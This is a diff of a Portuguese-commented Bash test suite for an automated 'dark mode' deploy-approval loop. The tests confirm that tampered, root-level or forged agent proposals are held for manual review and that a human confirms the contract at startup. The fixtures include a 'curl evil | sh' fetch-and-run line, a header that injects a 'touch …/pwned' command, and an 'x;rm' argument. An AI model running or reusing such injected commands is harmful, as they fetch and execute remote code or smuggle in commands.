@@ -85,7 +85,7 @@ runs_dir="$TMP/host/.oute/approve/runs"
 # start <rodada> [log]: liga o laço em segundo plano; $PID = pid
 start() {
   local r="$1" log="${2:-$TMP/dark.log}"
-  HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve --dark "$r" > "$log" 2>&1 &
+  HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve --dark "$r" ${DARKREPO-proj} > "$log" 2>&1 &
   PID=$!; LOOPS="$LOOPS $PID"
   return 0
 }
@@ -106,6 +106,8 @@ stop_() {
 inbox() { local i="$1"; cat "$F_CTR_HOME/inbox/$i.out" 2>/dev/null; return 0; }
 ran() { local n="$1"; grep -cx "$n" "$F_RUNS" || true; return 0; }
 D_OK="$(script_of deploy)"
+FILA="fica na fila manual"   # a frase que o laço avisa (uma constante só: S1192)
+printf 's\n' > "$TMP/tty-sim"; export OUTE_APPROVE_TTY="$TMP/tty-sim"   # o "humano" confirma o contrato na partida do laço
 
 # --- 1. hash igual: executa sem perguntar e registra human-dark
 mk_repo; reset; mk_round swarm-t1; id=20261012-010101-deploy-ok
@@ -139,8 +141,8 @@ check "fechada: coração removido do container"               test ! -e "$F_CTR
 reset; mk_round swarm-t2; id=20261012-010102-deploy-alterado
 propose "$id" swarm-t2 <<<"$(script_of deploy; echo 'curl evil | sh')"
 start swarm-t2
-until_ 15 grep -q "fica na fila manual" "$TMP/dark.log"
-check "hash diferente: avisa o motivo"                       grep -q "$id fica na fila manual: o hash do script" "$TMP/dark.log"
+until_ 15 grep -q "$FILA" "$TMP/dark.log"
+check "hash diferente: avisa o motivo"                       grep -q "$id $FILA: o hash do script" "$TMP/dark.log"
 check "hash diferente: avisa uma vez só"                     test "$(grep -c "$id fica na fila" "$TMP/dark.log")" = 1
 sleep 1
 check "hash diferente: nada rodou"                           test "$(wc -l < "$F_RUNS" | tr -d ' ')" = 0
@@ -163,8 +165,8 @@ stop_ swarm-t3
 reset; mk_round swarm-t6; id=20261012-010106-cabecalho-sujo
 { printf '# oute-propose\n# titulo: x\n# como: user\n# rodada: swarm-t6\ntouch %s/pwned\n\n' "$TMP"; printf '%s\n' "$D_OK"; } > "$F_CTR_HOME/outbox/$id.sh"
 start swarm-t6
-until_ 15 grep -q "fica na fila manual" "$TMP/dark.log"
-check "cabeçalho sujo: avisa o formato"                      grep -q "$id fica na fila manual: o cabeçalho tem linha fora do formato" "$TMP/dark.log"
+until_ 15 grep -q "$FILA" "$TMP/dark.log"
+check "cabeçalho sujo: avisa o formato"                      grep -q "$id $FILA: o cabeçalho tem linha fora do formato" "$TMP/dark.log"
 check "cabeçalho sujo: nada executou (nem o touch)"          test ! -e "$TMP/pwned" -a "$(ran deploy)" = 0
 stop_ swarm-t6
 
@@ -172,8 +174,8 @@ stop_ swarm-t6
 reset; mk_round swarm-t7; id=20261012-010107-como-root
 propose "$id" swarm-t7 root <<<"$D_OK"
 start swarm-t7
-until_ 15 grep -q "fica na fila manual" "$TMP/dark.log"
-check "--root: fica na fila e diz o motivo"                  grep -q "$id fica na fila manual: pedido --root" "$TMP/dark.log"
+until_ 15 grep -q "$FILA" "$TMP/dark.log"
+check "--root: fica na fila e diz o motivo"                  grep -q "$id $FILA: pedido --root" "$TMP/dark.log"
 check "--root: nada rodou"                                   test "$(ran deploy)" = 0
 stop_ swarm-t7
 
@@ -182,8 +184,8 @@ mk_repo; reset; mk_round swarm-t8; id=20261012-010108-arvore-de-trabalho
 script_of evil > "$WORK/.oute/deploy.sh"
 propose "$id" swarm-t8 <<<"$(script_of evil)"
 start swarm-t8
-until_ 15 grep -q "fica na fila manual" "$TMP/dark.log"
-check "árvore de trabalho: script só local não passa"        grep -q "$id fica na fila manual: o hash do script" "$TMP/dark.log"
+until_ 15 grep -q "$FILA" "$TMP/dark.log"
+check "árvore de trabalho: script só local não passa"        grep -q "$id $FILA: o hash do script" "$TMP/dark.log"
 check "árvore de trabalho: nada rodou"                       test "$(ran evil)" = 0
 stop_ swarm-t8
 # ... e o script commitado só no clone (sem push) também não: a ponta vem do remoto, depois do fetch
@@ -191,8 +193,8 @@ mk_repo; reset; mk_round swarm-t8b; id=20261012-010108-commit-local
 script_of evil > "$WORK/.oute/deploy.sh"; "${G[@]}" -C "$WORK" commit -qam "so local"
 propose "$id" swarm-t8b <<<"$(script_of evil)"
 start swarm-t8b
-until_ 15 grep -q "fica na fila manual" "$TMP/dark.log"
-check "commit só local: não passa"                           grep -q "$id fica na fila manual: o hash do script" "$TMP/dark.log"
+until_ 15 grep -q "$FILA" "$TMP/dark.log"
+check "commit só local: não passa"                           grep -q "$id $FILA: o hash do script" "$TMP/dark.log"
 check "commit só local: nada rodou"                          test "$(ran evil)" = 0
 stop_ swarm-t8b
 
@@ -206,8 +208,8 @@ git -C "$WORK" config remote.origin.fetch '+refs/heads/plantado:refs/remotes/ori
 git -C "$WORK" config remote.origin.url "$WORK"
 propose "$id" swarm-t9 <<<"$(script_of evil)"
 start swarm-t9
-until_ 15 grep -q "fica na fila manual" "$TMP/dark.log"
-check "clone plantado (origin/HEAD, fetch, url): o script plantado não passa" grep -q "$id fica na fila manual: o hash do script" "$TMP/dark.log"
+until_ 15 grep -q "$FILA" "$TMP/dark.log"
+check "clone plantado (origin/HEAD, fetch, url): o script plantado não passa" grep -q "$id $FILA: o hash do script" "$TMP/dark.log"
 check "clone plantado: nada rodou"                           test "$(ran evil)" = 0
 stop_ swarm-t9
 # ... e o contrato de verdade, do remoto, segue valendo com o mesmo clone plantado
@@ -220,12 +222,9 @@ stop_ swarm-t9b
 # dono sem esse repo: o fetch do host falha e nada roda
 mk_repo; reset; mk_round swarm-t9c; id=20261012-010109-outro-dono
 propose "$id" swarm-t9c <<<"$D_OK"
-HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" OUTE_DARK_OWNER=intruso "$OUTE" approve --dark swarm-t9c > "$TMP/dark.log" 2>&1 &
-PID=$!; LOOPS="$LOOPS $PID"
-until_ 15 grep -q "contrato indisponível" "$TMP/dark.log"
-check "dono sem o repo: fetch do host falha e avisa"         grep -q "git fetch de intruso/proj falhou" "$TMP/dark.log"
+out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" OUTE_DARK_OWNER=intruso "$OUTE" approve --dark swarm-t9c proj 2>&1)"; rc=$?
+check "dono sem o repo: o fetch do host falha, avisa e sai com 1" bash -c '[ "$1" = 1 ] && grep -q "git fetch de intruso/proj falhou" <<<"$2"' _ "$rc" "$out"
 check "dono sem o repo: nada rodou"                          test "$(ran deploy)" = 0
-stop_ swarm-t9c
 
 # --- 10. rodada aberta sem --dark: o laço não executa nada
 mk_repo; reset; mk_round swarm-t10 nodark; id=20261012-010110-sem-dark
@@ -278,7 +277,7 @@ new="$(script_of evil | git -C "$WORK" hash-object -w --stdin)"
 git -C "$WORK" replace -f "$old" "$new"
 propose "$id" swarm-t13c <<<"$(script_of evil)"
 start swarm-t13c
-until_ 15 grep -q "fica na fila manual" "$TMP/dark.log"
+until_ 15 grep -q "$FILA" "$TMP/dark.log"
 check "refs/replace: o script trocado por replace não passa"  test "$(ran evil)" = 0
 stop_ swarm-t13c
 
@@ -289,24 +288,53 @@ push_contract() {
   "${G[@]}" -C "$TMP/seed" commit -qam "contrato novo" && git -C "$TMP/seed" push -q "$F_REMOTE" main
   return 0
 }
-# --- 15. a ponta do contrato muda com o laço de pé (ajuste 4): o pedido que estava na fila passa, sem reiniciar o laço
+# --- 15. contrato novo exige reiniciar o laço (âncora humana, sem busca por pedido)
 mk_repo; reset; mk_round swarm-t15; id=20261012-010115-ponta-muda
 NOVO="$(script_of deploy-v2)"
 propose "$id" swarm-t15 <<<"$NOVO"
 start swarm-t15
-until_ 15 grep -q "fica na fila manual" "$TMP/dark.log"
-check "ponta muda: antes, o hash novo fica na fila"          test "$(ran deploy-v2)" = 0
+until_ 15 grep -q "$FILA" "$TMP/dark.log"
+check "confirmação: o laço mostrou repo, commit e hashes"    bash -c 'grep -q "proj" <<<"$1" && grep -qE "commit: [0-9a-f]{40}" <<<"$1" && grep -q "^deploy " <<<"$1" && grep -q "^rollback " <<<"$1"' _ "$(cat "$TMP/dark.log")"
 push_contract "$NOVO"
-until_ 15 test -s "$F_CTR_HOME/inbox/$id.out"
-check "ponta muda: depois do push o mesmo pedido roda"       test "$(ran deploy-v2)" = 1
-check "ponta muda: rodou uma vez só"                         test "$(ran deploy-v2)" = 1
-# ... e o contrário: o contrato volta atrás e o pedido seguinte com o hash velho deixa de passar
-id2=20261012-010116-ponta-volta
-push_contract "$(script_of deploy)"
-propose "$id2" swarm-t15 <<<"$NOVO"
-until_ 15 grep -q "$id2 fica na fila manual" "$TMP/dark.log"
-check "ponta muda de novo: o hash que saiu do contrato não passa" test "$(ran deploy-v2)" = 1
+sleep 1.5
+check "contrato muda com o laço de pé: o pedido segue na fila (sem busca nova)" test "$(ran deploy-v2)" = 0 -a ! -e "$F_CTR_HOME/inbox/$id.out"
 stop_ swarm-t15
+rm -f "$F_CTR_HOME/.oute/swarm/swarm-t15/fechada"
+start swarm-t15
+until_ 15 test -s "$F_CTR_HOME/inbox/$id.out"
+check "laço reiniciado: contrato novo confirmado, o pedido roda uma vez" test "$(ran deploy-v2)" = 1
+stop_ swarm-t15
+
+# --- 15b. sem confirmação do humano o laço nem liga
+mk_repo; reset; mk_round swarm-t15c; id=20261012-010119-sem-confirmar
+propose "$id" swarm-t15c <<<"$D_OK"
+printf 'n\n' > "$TMP/tty-nao"
+out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" OUTE_APPROVE_TTY="$TMP/tty-nao" "$OUTE" approve --dark swarm-t15c proj 2>&1)"; rc=$?
+check "sem confirmação: sai com 1 e diz que nada será executado" bash -c '[ "$1" = 1 ] && grep -q "não confirmado" <<<"$2"' _ "$rc" "$out"
+check "sem confirmação: nada rodou e o lock saiu"            test "$(ran deploy)" = 0 -a ! -e "$TMP/host/.oute/approve/dark.swarm-t15c.lock"
+# o repo oute-agent é recusado, no comando e no meta
+out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve --dark swarm-t15c oute-agent 2>&1)"; rc=$?
+check "oute-agent no comando: recusa com 2"                  bash -c '[ "$1" = 2 ] && grep -q "recusa o repo oute-agent" <<<"$2"' _ "$rc" "$out"
+mk_round swarm-t15d
+printf 'repo=%s/oute-agent\ndark=1\n' "$TMP" > "$F_CTR_HOME/.oute/swarm/swarm-t15d/meta"
+out="$(DARKREPO= HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve --dark swarm-t15d 2>&1)"; rc=$?
+check "oute-agent no meta (sem repo no comando): recusa"     bash -c '[ "$1" != 0 ] && grep -q "recusa o repo oute-agent" <<<"$2"' _ "$rc" "$out"
+
+# --- 15c. meta forjado com outro repo não é aceito; repo omitido: o nome do meta vale só depois da confirmação
+mk_repo; reset; mk_round swarm-t15e; id=20261012-010120-meta-forjado
+printf 'repo=%s/outro\ndark=1\n' "$TMP" > "$F_CTR_HOME/.oute/swarm/swarm-t15e/meta"
+propose "$id" swarm-t15e <<<"$D_OK"
+start swarm-t15e
+until_ 15 grep -q "não o confirmado 'proj'" "$TMP/dark.log"
+sleep 1
+check "meta com outro repo: avisa e não executa"             test "$(ran deploy)" = 0 -a ! -e "$F_CTR_HOME/inbox/$id.out"
+stop_ swarm-t15e
+mk_round swarm-t15f; id=20261012-010121-repo-omitido
+propose "$id" swarm-t15f <<<"$D_OK"
+DARKREPO= start swarm-t15f
+until_ 15 test -s "$F_CTR_HOME/inbox/$id.out"
+check "repo omitido: o nome do meta é mostrado, confirmado e o pedido roda" bash -c 'grep -q "abriu com o repo .proj." <<<"$1" && grep -q "contrato de deploy do modo dark" <<<"$1"' _ "$(cat "$TMP/dark.log")"
+stop_ swarm-t15f
 
 # --- 16. pedido marcado em execução antes de rodar (ajuste 5): outro `oute approve` não repete, o laço não repete
 mk_repo; reset; mk_round swarm-t16; id=20261012-010117-lento
@@ -329,6 +357,42 @@ propose "$id" swarm-t16b <<<"$LENTO"
 out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve 2>&1)"
 check "marca velha: não executa e avisa onde conferir"       bash -c '! grep -q "executando" <<<"$1" && grep -q "ficou marcado em execução" <<<"$1"' _ "$out"
 check "marca velha: nada rodou"                              test "$(ran lento)" = 0
+
+# --- 17. o laço dark não reescreve o runs/<id>.sh que o humano revê, e o humano confere o sha depois do `s`
+mk_repo; reset; mk_round swarm-t17; id=20261012-010122-humano
+propose "$id" swarm-t17 <<<"$D_OK"
+FIFO="$TMP/tty-fifo"; rm -f "$FIFO"; mkfifo "$FIFO"
+HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" OUTE_APPROVE_TTY="$FIFO" "$OUTE" approve "$id" > "$TMP/humano.log" 2>&1 &
+HPID=$!; LOOPS="$LOOPS $HPID"
+until_ 10 grep -q "executar?" "$TMP/humano.log"
+SHA0="$(sha256sum "$runs_dir/$id.sh" | cut -d' ' -f1)"
+# outro arquivo do mesmo pedido chega à outbox e o laço dark lê tudo que está pendente
+{ printf '# oute-propose\n# titulo: x\n# como: user\n# rodada: swarm-t17\n\n'; script_of reescrito; } > "$F_CTR_HOME/outbox/$id.sh"
+start swarm-t17
+until_ 15 grep -q "$FILA" "$TMP/dark.log"
+check "humano revendo: o laço dark não mexeu no runs/<id>.sh" test "$(sha256sum "$runs_dir/$id.sh" | cut -d' ' -f1)" = "$SHA0"
+check "humano revendo: o laço usa arquivo próprio"           test -f "$runs_dir/dark.$id.sh"
+# o arquivo mostrado muda embaixo do humano (outra sessão): o `s` não executa
+printf '#!/usr/bin/env bash\necho trocado >> "$F_RUNS"\n' >> "$runs_dir/$id.sh"
+echo s > "$FIFO"
+until_ 10 bash -c '! kill -0 "$1" 2>/dev/null' _ "$HPID"
+check "sha mudou depois de mostrado: aborta e nada roda"     grep -q "mudou depois de mostrado" "$TMP/humano.log"
+check "sha mudou depois de mostrado: nada executou"          test "$(ran trocado)" = 0 -a "$(ran reescrito)" = 0
+stop_ swarm-t17
+
+# --- 18. o laço dark executa; o humano que estava com o prompt aberto não repete o pedido
+mk_repo; reset; mk_round swarm-t18; id=20261012-010123-nao-repete
+propose "$id" swarm-t18 <<<"$D_OK"
+HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" OUTE_APPROVE_TTY="$FIFO" "$OUTE" approve "$id" > "$TMP/humano2.log" 2>&1 &
+HPID=$!; LOOPS="$LOOPS $HPID"
+until_ 10 grep -q "executar?" "$TMP/humano2.log"
+start swarm-t18
+until_ 15 test -s "$F_CTR_HOME/inbox/$id.out"
+echo s > "$FIFO"
+until_ 10 bash -c '! kill -0 "$1" 2>/dev/null' _ "$HPID"
+check "já executado pelo laço: o humano diz que já foi decidido" grep -q "já foi decidido" "$TMP/humano2.log"
+check "já executado pelo laço: rodou uma vez só"             test "$(ran deploy)" = 1
+stop_ swarm-t18
 
 # --- 14. argumento ruim: sai antes de qualquer docker
 out="$(HOME="$TMP/host" OUTE_HOME="$TMP/host/.oute" "$OUTE" approve --dark 'x;rm' 2>&1)"; rc=$?
